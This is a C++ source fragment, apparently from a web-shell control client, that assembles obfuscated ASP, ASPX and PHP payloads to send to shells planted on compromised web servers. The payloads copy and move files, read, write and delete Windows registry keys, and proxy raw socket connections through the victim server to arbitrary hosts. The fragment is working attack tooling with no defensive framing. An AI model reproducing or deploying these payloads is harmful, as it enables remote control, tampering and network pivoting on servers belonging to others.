	//z1=UHJvdmlkZXI9TWljcm9zb2Z0LkpldC5PTEVEQi40LjA7RGF0YSBTb3VyY2U9Yzpcd3d3XGRiLm1kYg%3D%3D
	//&z2=U0VMRUNUIENPVU5UKCopIEFTIENOVCBGUk9NIFtTaXRlVGFibGVd

	szProxyGetInfo =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$a="
		"$_POST[\"a\"];$b=$_POST[\"b\"];$c=$_POST[\"c\"];$d=$_POST[\"d\"];$e=base64_decode($_POST[\"e\"]);$f="
		"'';$fp = fsockopen($a.$b,$c?$c:80,$errno,$errstr,$d?$d:30);if(!$fp) exit(\"ERROR://\".$errstr.$errno"
		".\"|<-\");fputs($fp, $e);while ($fp && !feof($fp)) $f .= fread($fp, 1024);fclose($fp);echo($f.\"|<-\""
		");die();") + "&";

	//////////////////////////////////////////////////////////////////////////
	szFileCopy[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3D"
		"Mid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26"
		"chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3D"
		"i%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\")"
		":Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53463D5265717565737428227A3122293A444"
		"63D5265717565737428227A3222293A5365742046733D4372656174654F626A6563742822536372697074696E672E4669"
		"6C6553797374656D4F626A65637422293A49662046732E466F6C64657245786973747328534629205468656E3A46732E4"
		"36F7079466F6C6465722053462C44463A456C73653A46732E436F707946696C652053462C44463A456E642049663A5365"
		"742046733D4E6F7468696E673A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E446573637"
		"2697074696F6E3A656C73653A53493D2231223A456E642049663A526573706F6E73652E577269746528534929\"\"\"\")"
		"):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";

	szFileCopy[1] =	Ini_szASPX_POST_DATA + "&z1=";
	szFileCopy[1].Replace("%szBase64EvalCode%", "dmFyIFM9UmVxdWVzdC5JdGVtWyJ6MSJdO3ZhciBEPVJlcXVlc3QuSXRlbVsiejIiXTtmdW5jdGlvbiBjcChTOl"
		"N0cmluZyxEOlN0cmluZyl7aWYoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoUykpe3ZhciBtPW5ldyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyhTKTt2YX"
		"IgaTt2YXIgZj1tLkdldEZpbGVzKCk7dmFyIGQ9bS5HZXREaXJlY3RvcmllcygpO1N5c3RlbS5JTy5EaXJlY3RvcnkuQ3JlYXRlRGlyZWN0b3J5KEQpO2Zvci"
		"AoaSBpbiBmKVN5c3RlbS5JTy5GaWxlLkNvcHkoUysiXFwiK2ZbaV0uTmFtZSxEKyJcXCIrZltpXS5OYW1lKTtmb3IgKGkgaW4gZCljcChTKyJcXCIrZFtpXS"
		"5OYW1lLEQrIlxcIitkW2ldLk5hbWUpO31lbHNle1N5c3RlbS5JTy5GaWxlLkNvcHkoUyxEKTt9fWNwKFMsRCk7UmVzcG9uc2UuV3JpdGUoIjEiKTs%3D");

																//文件复制
	szFileCopy[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$fc=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$fp=$m?stripslashes($_POS"
		"T[\"z2\"]):$_POST[\"z2\"];function xcopy($src,$dest){if(is_file($src)){if(!copy($src,$dest))return f"
		"alse;else return true;}$m=@dir($src);if(!is_dir($dest))if(!@mkdir($dest))return false;while($f=$m->r"
		"ead()){$isrc=$src.chr(47).$f;$idest=$dest.chr(47).$f;if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46)"
		".chr(46))){if(!xcopy($isrc,$idest))return false;}else if(is_file($isrc)){if(!copy($isrc,$idest))retu"
		"rn false;}}return true;}echo(xcopy($fc,$fp)?\"1\":\"0\");;echo(\"|<-\");die();") + "&z1=";

	szFileCopy[3] = "";
	//////////////////////////////////////////////////////////////////////////
	szFileCut[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3D"
		"Mid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26"
		"chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3D"
		"i%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\")"
		":Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53463d5265717565737428227a3122293a4446"
		"3d5265717565737428227a3222293a5365742046733d4372656174654f626a6563742822536372697074696e672e46696c"
		"6553797374656d4f626a65637422293a49662046732e466f6c64657245786973747328534629205468656e3a4966206c65"
		"66742853462c31293d6c6566742844462c3129205468656e3a46732e4d6f7665466f6c6465722053462c44463a456c7365"
		"3a46732e436f7079466f6c6465722053462c44463a46732e44656c657465466f6c6465722053463a456e642049663a456c"
		"73653a46732e4d6f766546696c652053462c44463a456e642049663a5365742046733d4e6f7468696e673a496620457272"
		"205468656e3a53493d224552524f523a2f2f2022264572722e4465736372697074696f6e3a656c73653a53493d2231223a456e642049663a526573706f6e73652e577269746528534929\"\"\"\")"
		"):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";

	szFileCut[1] =	Ini_szASPX_POST_DATA + "&z1=";
	szFileCut[1].Replace("%szBase64EvalCode%", "dmFyIFM9UmVxdWVzdC5JdGVtWyJ6MSJdO3ZhciBEPVJlcXVlc3QuSXRlbVsiejIiX"
		"TtmdW5jdGlvbiBtdihTOlN0cmluZyxEOlN0cmluZyl7aWYoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoUykpe3ZhciBtPW5l"
		"dyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyhTKTt2YXIgaTt2YXIgZj1tLkdldEZpbGVzKCk7dmFyIGQ9bS5HZXREaXJlY3Rvcml"
		"lcygpO1N5c3RlbS5JTy5EaXJlY3RvcnkuQ3JlYXRlRGlyZWN0b3J5KEQpO2ZvcihpIGluIGYpU3lzdGVtLklPLkZpbGUuTW92ZS"
		"hTKyJcXCIrZltpXS5OYW1lLEQrIlxcIitmW2ldLk5hbWUpO2ZvcihpIGluIGQpbXYoUysiXFwiK2RbaV0uTmFtZSxEKyJcXCIrZ"
		"FtpXS5OYW1lKTt9ZWxzZXtTeXN0ZW0uSU8uRmlsZS5Nb3ZlKFMsRCk7fX1tdihTLEQpO1N5c3RlbS5JTy5EaXJlY3RvcnkuRGVsZXRlKFMsdHJ1ZSk7UmVzcG9uc2UuV3JpdGUoIjEiKTs%3D");

																//文件剪切
	szFileCut[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m="
		"get_magic_quotes_gpc();$fc=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$fp=$m?stripslashes($_POST"
		"[\"z2\"]):$_POST[\"z2\"];function cut($src,$dest){if(is_file($src)){if(!copy($src,$dest))return fals"
		"e;else return true;}$m=@dir($src);if(!is_dir($dest))if(!@mkdir($dest))return false;while($f=$m->read"
		"()){$isrc=$src.chr(47).$f;$idest=$dest.chr(47).$f;if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46).ch"
		"r(46))){if(!cut($isrc,$idest))return false;}else if(is_file($isrc)){if(!copy($isrc,$idest))return fa"
		"lse;if(!unlink($isrc))return false;}rmdir($isrc);}$m->close();return true;}if($fc[0]==$fp[0])echo(re"
		"name($fc,$fp)?\"1\":\"0\");else{echo(cut($fc,$fp)?\"1\":\"0\");rmdir($fc);}exit(\"|<-\");") + "&z1=";

																//注册表读取
	szRegistryRead[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3D"
		"Mid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26"
		"chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3D"
		"i%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\")"
		":Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"526573706F6E73652E577269746528437265617"
		"4654F626A6563742822575363726970742E5368656C6C22292E52656752656164285265717565737428227A31222929293"
		"A496620457272205468656E3A526573706F6E73652E577269746528224552524F523A2F2F2022264572722E44657363726"
		"97074696F6E293A4572722E436C6561723A456E64204966\"\"\"\")"
		"):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";

	szRegistryRead[1] =	Ini_szASPX_POST_DATA + "&z1=";
	szRegistryRead[1].Replace("%szBase64EvalCode%", "dmFyIFM9UmVxdWVzdC5JdGVtWyJ6MSJdO3ZhciBEPVJlcXVlc3QuSXRlbVsiejIiX"
		"TtmdW5jdGlvbiBtdihTOlN0cmluZyxEOlN0cmluZyl7aWYoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoUykpe3ZhciBtPW5l"
		"dyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyhTKTt2YXIgaTt2YXIgZj1tLkdldEZpbGVzKCk7dmFyIGQ9bS5HZXREaXJlY3Rvcml"
		"lcygpO1N5c3RlbS5JTy5EaXJlY3RvcnkuQ3JlYXRlRGlyZWN0b3J5KEQpO2ZvcihpIGluIGYpU3lzdGVtLklPLkZpbGUuTW92ZS"
		"hTKyJcXCIrZltpXS5OYW1lLEQrIlxcIitmW2ldLk5hbWUpO2ZvcihpIGluIGQpbXYoUysiXFwiK2RbaV0uTmFtZSxEKyJcXCIrZ"
		"FtpXS5OYW1lKTt9ZWxzZXtTeXN0ZW0uSU8uRmlsZS5Nb3ZlKFMsRCk7fX1tdihTLEQpO1N5c3RlbS5JTy5EaXJlY3RvcnkuRGVsZXRlKFMsdHJ1ZSk7UmVzcG9uc2UuV3JpdGUoIjEiKTs%3D");

	szRegistryRead[2] = Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo('->|');$m=get_magic_quotes_gpc();"
		"$k=$m?stripslashes($_POST['z1']):$_POST['z1'];"
		"$C=new COM('WScript.Shell')or exit('ERROR:// This thing requires Windows Scripting Host|<-');try{"
		"echo $C->RegRead($k);"
		"}catch(Exception $e){echo 'ERROR:// Message: '.$e->getMessage();}exit('|<-');") + "&z1=";




																//注册表写入
	szRegistryWrite[2] = Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo('->|');$m=get_magic_quotes_gpc();"
		"$k=$m?stripslashes($_POST['z1']):$_POST['z1'];"
		"$C=new COM('WScript.Shell')or exit('ERROR:// This thing requires Windows Scripting Host|<-');try{"
		"$C->RegWrite($k,base64_decode($_POST['z3']),$_POST['z2']);"
		"}catch(Exception $e){echo 'ERROR:// Message: '.$e->getMessage();}exit('|<-');") + "&z1=";

																//注册表删除
	szRegistryDelete[2] = Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo('->|');$m=get_magic_quotes_gpc();"
		"$k=$m?stripslashes($_POST['z1']):$_POST['z1'];"
		"$C=new COM('WScript.Shell')or exit('ERROR:// This thing requires Windows Scripting Host|<-');try{"
		"$C->RegDelete($k);"
		"}catch(Exception $e){echo 'ERROR:// Message: '.$e->getMessage();}exit('|<-');") + "&z1=";
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////	初始化
}
